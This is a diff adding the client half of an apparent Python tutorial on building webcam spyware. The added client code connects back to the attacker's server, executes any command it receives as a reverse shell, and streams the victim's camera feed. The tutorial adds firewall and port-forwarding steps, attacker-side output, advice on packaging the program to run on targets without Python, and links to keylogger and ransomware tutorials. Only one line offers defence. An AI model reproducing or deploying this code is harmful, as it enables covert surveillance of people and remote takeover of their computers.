@@ -308,3 +308,146 @@ That's it. We're done with the server_side.py.
 
 
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  
+Client Code
+
+Move to your target machine (client-side), open up a new Python file, and name it client.py and follow along.
+
+On the client side, the only module we need to install is Opencv-Python (which we already installed on the server side):
+
+$ pip install opencv-python
+
+Afterwards, include the following code in your clients.py:
+
+import socket # For network (client-server) communication.
+import os # For handling os executions.
+import subprocess # For executing system commands.
+import cv2 # For recording the video.
+import threading # For recording the video in a different thread.
+import platform # We use this to get the os of the target (client).
+
+SERVER_HOST = "<Enter your server's IP Address here>"
+SERVER_PORT = 4000
+BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, you can adjust this.
+# Separator string for sending 2 messages at a time.
+SEPARATOR = "<sep>"
+# Create the socket object.
+s = socket.socket()
+# Connect to the server.
+s.connect((SERVER_HOST, SERVER_PORT))
+# Get the current directory and os and send it to the server.
+cwd = os.getcwd()
+targets_os = platform.system()
+s.send(cwd.encode())
+s.send(targets_os.encode())
+
+This client-side code sets up a socket connection to the server, sends the client's current working directory and operating system to the server, and enters a command handling loop.
+
+Lastly, we create a function to handle the video recording on the target system.
+
+# Function to record and send the video.
+def record_video():
+    global cap
+    cap = cv2.VideoCapture(0)
+    while True:
+        ret, frame = cap.read()
+        if not ret:
+            break
+        _, frame_bytes = cv2.imencode('.jpg', frame)
+        frame_size = len(frame_bytes)
+        s.sendall(frame_size.to_bytes(4, byteorder='little'))
+        s.sendall(frame_bytes)
+    cap.release()
+    cv2.destroyAllWindows()
+
+while True:
+    # receive the command from the server.
+    command = s.recv(BUFFER_SIZE).decode()
+    splited_command = command.split()
+    if command.lower() == "exit":
+        # if the command is exit, just break out of the loop.
+        break
+    elif command.lower() == "start":
+        # Start recording video in a separate thread
+        recording_thread = threading.Thread(target=record_video)
+        recording_thread.start()
+        output = "Video recording started."
+        print(output)
+    else:
+        # execute the command and retrieve the results.
+        output = subprocess.getoutput(command)
+        # get the current working directory as output.
+        cwd = os.getcwd()
+        # send the results back to the server.
+        message = f"{output}{SEPARATOR}{cwd}"
+        s.send(message.encode())
+# close client connection.
+s.close()
+
+This part of the code handles the video recording and command execution on the client side:
+
+    The record_video() function captures video frames from the client's camera, encodes them, and continuously sends them to the server (for the attacker to stream).
+    The main loop receives commands from the server. If the command is "exit", the loop breaks. If the command is "start", a separate thread is created to execute the record_video() function and start the video recording. For any other command, the client executes the command using subprocess.getoutput(), gets the current working directory, and sends the output back to the server.
+    Finally, the client closes the socket connection to the server.
+
+ 
+Running our Programs
+
+Now, we're done with the client and server code. Let's run it. To execute these programs, you have to be very careful. You need to make sure the server_side.py is running before you run the client.py. Remember I said we would get a reverse connection from the client. So we have to listen to the connection first. Otherwise, even if the program is executed on the client side, we won't gain remote access.
+
+Also, I'm running this on a local network. If you wish to run the server code on a remote machine and not on the local network, then make sure you allow the port on your firewall. If it's a VM in the cloud, then make sure you allow it via ufw:
+
+$ ufw allow 4000
+
+This will tell the firewall to allow that port for remote communication. If the server is in your home, you must enable the port on your router settings, which you can typically access using the web browser via the router's IP address, typically 192.168.1.1. You can check the default gateway IP (router's IP) using the ipconfig command on Windows, or ip route | grep default on Linux and macOS.
+
+So, run the server_side.py:
+
+$ python server_side.py
+Listening as 0.0.0.0 on port 4000 ...
+
+While the server code is running and waiting for a connection, we can then run our client code:
+
+$ python client.py
+
+As soon as you run the client.py, you should receive a reverse connection on the server side. To start the surveillance of the client, type "start" as we specified in our code. Like this:
+
+$ python server_side.py
+Listening as 0.0.0.0 on port 4000 ...
+192.168.134.1:57098 Connected!
+[+] Current working directory:  C:\Users\muham\Documents\TPC\spyware
+[+] Target's Operating system:  Windows
+C:\Users\muham\Documents\TPC\spyware $> start
+
+The client code:
+
+We can see that on the server side, we got access to the same directory where the client.py code got executed.
+
+After typing the start command as shown above, we get a screen on the server side showing us everything going on the client side via the client's camera:
+
+This is from the attacker machine. I am able to see what's going on in the client's machine.
+
+To stop recording, simply hit 'q'. The recording will be saved to your current working directory on the server:
+
+That's it, we're done.
+
+To protect against this attack, consider using a camera privacy cover. You can get one here. You can also improvise by using a tape. Also, avoid clicking suspicious, unexpected links. Use Anti-Malware and stay sharp.
+Extra Notes
+
+When you run 'start' and you hit 'q' to stop recording, if for some reason you want to start recording again, you need to give some time for the previous process to finish executing. Give it at least a minute or two. A better solution is to exit the program and run again.
+
+If you want to learn more about gaining remote access to computers and building reverse shells, check this tutorial.
+
+As you can see, this is a demonstration. In a real-world scenario, your target may not have Python installed on their computer. So you would need to package this program in such a way that it is executable on any computer - whether Python is installed or not. We cover that in this tutorial.
+
+Here are some other malware variants to excitingly build with Python:
+
+    How to Create A Fork Bomb in Python
+    How to Make a Keylogger in Python
+    How to Make a Ransomware in Python
+    How to Create a Reverse Shell in Python
+
+Finally, if you want to level up from being a script kiddie to a Pro Hacker - Building your own scripts, then check out our Ethical Hacking with Python eBook. This is the ideal resource to level up. Mediocrity is never an option!
+
+I hope you enjoyed this one, till next time.
+
+Loved the article? You'll love our Code Converter even more! It's your secret weapon for effortless coding. Give it a whirl!
